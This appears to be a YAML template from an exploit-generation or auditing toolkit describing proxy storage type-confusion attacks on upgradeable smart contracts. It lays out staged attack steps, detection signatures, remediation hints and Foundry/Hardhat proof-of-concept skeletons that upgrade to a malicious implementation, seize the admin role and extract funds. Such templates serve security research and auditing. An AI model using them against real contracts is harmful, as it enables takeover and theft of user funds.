metadata:
  id: type-confusion-001
  name: Proxy Storage Type Confusion
  description: >-
    Targets upgradeable proxy systems where implementation contracts interpret
    shared storage slots with incompatible types, enabling privilege escalation
    or arbitrary writes.
  severity: high
  tags:
    - type_confusion
    - upgradeable_proxy
    - storage_collision
  vulnerability_classes:
    - type_confusion
    - proxy_storage
  historical_references:
    - incident: Parity multisig v2 upgrade issue
      year: 2017
      details: Initialization routine clobbered privileged storage, locking funds.
      link: https://www.parity.io/security-alert.html
    - incident: Audius governance takeover
      year: 2022
      details: Malicious upgrade exploited mismatched storage layout to seize admin role.
      link: https://hacken.io/discover/audius-exploit/
provenance:
  source: Advanced exploit template research sprint
  contributor: Storage Safety Guild
  last_reviewed: 2024-04-18
  confidence: medium
stages:
  - name: Layout Enumeration
    objective: Map proxy and implementation storage slots and type encodings.
    actions:
      - Dump storage slots for proxy admin and implementation.
      - Compare struct packing between current and target implementations.
      - Identify upgradeable slots lacking `storageGap` padding.
    detection_signatures:
      onchain:
        - delegatecall traces to implementation slot
        - StorageSlotWritten events without matching schema version bump
      offchain:
        - ABI definitions with mismatched field types
    poc_snippet: |
      bytes32 slot = vm.load(address(proxy), ADMIN_SLOT);
      emit log_bytes32(slot);
  - name: Confusion Priming
    objective: Set storage values that decode maliciously under the new type layout.
    actions:
      - Write crafted bytes into arrays/structs via publicly accessible setters.
      - Abuse ERC1967 upgrade path to point to controlled implementation.
      - Flip boolean flags used for initialization guards.
    detection_signatures:
      onchain:
        - upgradeTo(address attackerImpl)
        - storage slot mutated via low-level `call`
      offchain:
        - deployment artifacts missing storage layout manifests
    poc_snippet: |
      proxy.execute(abi.encodeWithSignature("setConfig(bytes32)", payload));
  - name: Exploit Activation
    objective: Invoke function that reinterprets the corrupted slot, granting control.
    actions:
      - Call initialize function to seize admin role.
      - Trigger upgrade path that reads bool as address.
      - Extract funds via newly acquired role.
    detection_signatures:
      onchain:
        - emit AdminChanged(attacker, attacker)
        - abnormal balance transfers to proxy caller
      offchain:
        - governance logs showing unexpected proposer address
    poc_snippet: |
      // bool interpreted as address
      address admin = IProxy(address(proxy)).admin();
      assertEq(admin, attacker);
  - name: Recovery and Proof Packaging
    objective: Document confusion pathway and ensure reproduction steps are clear.
    actions:
      - Dump before/after storage and include diffs.
      - Capture upgrade events leading to confusion.
      - Provide remediation guidance (storage gaps, layout scripts).
    detection_signatures:
      onchain:
        - storage diff shows cross-type reinterpretation
      offchain:
        - build artifacts lacking `storage-layout.json`
    poc_snippet: |
      // Storage diff for report
      bytes32 beforeSlot = snapshots[ADMIN_SLOT];
      bytes32 afterSlot = vm.load(address(proxy), ADMIN_SLOT);
      assertTrue(beforeSlot != afterSlot);
detection_signatures:
  onchain:
    - delegatecall to implementation with mismatched selectors
    - upgradeTo/upgradeToAndCall without storage gap updates
  offchain:
    - storage layout mismatch flagged by slither or foundry inspect
poc_skeletons:
  foundry:
    required_imports:
      - forge-std/Test.sol
    setup_outline: Deploy proxy+logic pair, snapshot storage layout, craft malicious payload.
    exploit_outline: Overwrite storage slot via user-accessible method, call initializer to seize admin role.
    validation_outline: Assert admin/owner role now equals attacker and funds transferable.
    code: |
      // SPDX-License-Identifier: MIT
      pragma solidity ^0.8.19;

      import "forge-std/Test.sol";
      import "../src/{contract_name}.sol";

      contract TypeConfusionExploit is Test {
          UpgradeableProxy proxy;
          address attacker = address(this);

          function setUp() public {
              proxy = new UpgradeableProxy(address(new {contract_name}()), attacker, "");
              vm.deal(address(proxy), 100 ether);
          }

          function testTypeConfusionUpgrade() public {
              bytes memory payload = abi.encodePacked(attacker);
              proxy.execute(abi.encodeWithSignature("setConfig(bytes32)", keccak256(payload)));

              proxy.upgradeTo(address(new MaliciousImplementation()));
              vm.prank(attacker);
              proxy.callUpgradeHook();

              assertEq(proxy.admin(), attacker);
          }
      }
  hardhat:
    required_imports:
      - "hardhat"
      - "@openzeppelin/upgrades-core"
    setup_outline: Deploy OZ proxy, capture layout artifacts, craft upgrade with mismatched types.
    exploit_outline: Use admin signer to point proxy to malicious impl, reinitialize to seize role.
    validation_outline: Query proxy admin and demonstrate arbitrary call capability.
    code: |
      const { ethers } = require("hardhat");

      describe("Type Confusion Exploit", function () {
        let proxy, attacker;

        beforeEach(async () => {
          const [deployer, attackerSigner] = await ethers.getSigners();
          attacker = attackerSigner;
          const Logic = await ethers.getContractFactory("{contract_name}");
          const logic = await Logic.deploy();
          proxy = await upgrades.deployProxy(Logic, [], { initializer: false });
        });

        it("reinterprets storage as attacker address", async function () {
          // TODO: fill with crafted storage writes
          await proxy.connect(attacker).callStatic("upgradeHook()", []);
        });
      });
metrics:
  baseline_success_rate: 0.33
  references_tested: 5
